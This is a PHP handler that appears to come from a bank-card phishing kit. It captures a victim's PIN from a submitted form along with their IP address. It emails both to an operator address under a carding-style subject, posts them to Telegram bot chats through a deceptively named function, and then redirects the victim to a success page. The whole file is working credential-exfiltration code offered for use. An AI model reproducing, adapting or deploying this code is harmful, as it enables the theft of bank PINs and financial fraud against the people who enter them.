<?php

require_once "functions.php";
include_once 'config.php';

ob_start();
if(!isset($_SESSION)) {
    session_start();
}


$pin = $_POST['pin'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') 

$_SESSION['pin']  = $pin;

$message = '
[♾️]  pin [♾️]

📱 pin: '.$_SESSION['pin'].'

🛒 Adresse IP : ' . $_SERVER['REMOTE_ADDR'] . '

';
if($mail_send == true){
    $Subject="「DGT CC | " . $bin . " | " . $_SESSION['bin_bank'] . " | " . $_SERVER['REMOTE_ADDR'];
    $head="From: dgt@rez.cc <info@INUN.bg>";
    
    mail($rezmail,$Subject,$message,$head);
    }
    
    $theip = $message;
   function antiBotsCaller($messaggio,$bot_token,$rez_chat) {
       $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $rez_chat;
       $url = $url . "&text=" . urlencode($messaggio);
       $ch = curl_init();
       $optArray = array(CURLOPT_URL => $url,CURLOPT_RETURNTRANSFER => true);curl_setopt_array($ch, $optArray);$result = curl_exec($ch);curl_close($ch);return $result;}antiBotsCaller($theip,$antit2,$antic1);antiBotsCaller($message,$bot_token,$rez_chat);

	
		header('Location: success.php');
